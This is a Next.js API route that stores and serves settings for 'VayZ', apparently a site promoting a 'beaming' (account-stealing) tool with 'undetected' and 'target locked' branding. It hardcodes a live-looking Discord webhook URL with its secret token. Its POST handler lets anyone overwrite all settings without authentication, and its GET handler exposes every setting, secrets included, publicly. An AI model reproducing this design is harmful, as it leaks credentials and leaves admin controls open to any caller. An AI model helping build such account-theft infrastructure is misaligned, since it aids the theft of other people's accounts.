import { NextResponse } from "next/server"

// Store settings in memory (in production, use a database)
let websiteSettings = {
  discordBotToken: "",
  redirectUrl: "https://your-website.com",
  webhookUrl:
    "https://discord.com/api/webhooks/1376176389333713038/Bqf0nU5DBHvBjVJti4AJQ4iTAxGo2dQiyior_Z001hoNsCYzqWvu9QgtpdTIiABwX7PU",
  siteName: "VayZ",
  mainTitle: "DOMINATE THE GAME",
  description:
    "Master the art of beaming with our cutting-edge tools and techniques. Designed for elite operators who demand precision and stealth in every operation.",
  testNotificationMessage: "🔧 Admin test notification from VayZ control panel",
  activationMessage:
    "🚀 Someone just activated VayZ! Current users: {onlineCount} online, {memberCount} total members.",
  websiteTexts: {
    logoText: "VayZ SYSTEMS",
    mainTitle: "DOMINATE",
    mainSubtitle: "THE GAME",
    description:
      "Master the art of beaming with our cutting-edge tools and techniques. Designed for elite operators who demand precision and stealth in every operation.",
    buttonText: "ACTIVATE NOW",
    statusText1: "Beamer Active",
    statusText2Online: "Target Locked",
    statusText2Offline: "Connection Lost",
    sideNavTooltip1: "UNDETECTED",
    sideNavTooltip2: "PREMIUM",
    sideNavTooltip3: "ULTRA FAST",
    topStatus1: "UNDETECTED",
    topStatus2: "PREMIUM",
    topStatus3: "ULTRA FAST",
    feature1Title: "Lightning Performance",
    feature1Description: "Experience unmatched speed and responsiveness with our optimized engine.",
    feature2Title: "Military-Grade Security",
    feature2Description: "Advanced protection protocols keep you safe and undetected at all times.",
    feature3Title: "Auto-Evolution",
    feature3Description: "Continuous updates and improvements delivered seamlessly in real-time.",
    stat1Label: "Success Rate",
    stat1Value: "99.9%",
    stat2Label: "Support",
    stat2Value: "24/7",
    stat3Label: "Community",
  },
  lastUpdated: new Date(),
}

export async function POST(request: Request) {
  try {
    const newSettings = await request.json()

    // Update settings
    websiteSettings = {
      ...websiteSettings,
      ...newSettings,
      lastUpdated: new Date(),
    }

    console.log("Settings updated:", Object.keys(newSettings))

    return NextResponse.json({
      success: true,
      message: "Settings saved successfully",
      settings: websiteSettings,
    })
  } catch (error) {
    console.error("Settings save error:", error)
    return NextResponse.json({ error: "Failed to save settings" }, { status: 500 })
  }
}

export async function GET() {
  return NextResponse.json({
    settings: websiteSettings,
  })
}
